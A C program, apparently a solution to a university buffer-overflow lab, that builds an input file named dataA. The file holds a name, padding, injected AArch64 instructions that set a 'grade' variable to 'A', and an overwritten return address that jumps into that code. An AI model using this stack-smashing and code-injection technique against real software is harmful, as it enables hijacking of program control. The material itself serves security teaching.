/*--------------------------------------------------------------------*/
/* Produces a file called dataA with the student name, a nullbyte,    */
/* padding, assembly instructions to overwrite grade, and padding of  */
/* null bytes.                                                        */
/*                                                                    */
/* Authors: Maxwell Lloyd and Venus Dinari                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

int main(void){
   FILE *psFile;
   unsigned long ulData;
   unsigned int ulInstruction;
   unsigned long pAAttack;
   int i;

   psFile = fopen("dataA", "w");

   /* Writes the new x30 for getName to skip to our assembly */
   pAAttack = 0x420058;
   
   /* Writes the student's names */
   ulData = 0x00006E655678614D;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* mov w0, 'A'   */
   ulInstruction = MiniAssembler_mov(0, 65);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* adr x1, grade */
   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 8 + 4);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* strb wo, [x1] */
   ulInstruction = MiniAssembler_strb(0, 1);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* b  printf     */
   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 8 + 12);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);


   /* Writes the null byte at the end of the instructions */
   for (i = 0; i < 24; i++)
      putc(0x00, psFile); /* Writes '00000000' */

   pAAttack = pAAttack + 8;
   fwrite(&pAAttack, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}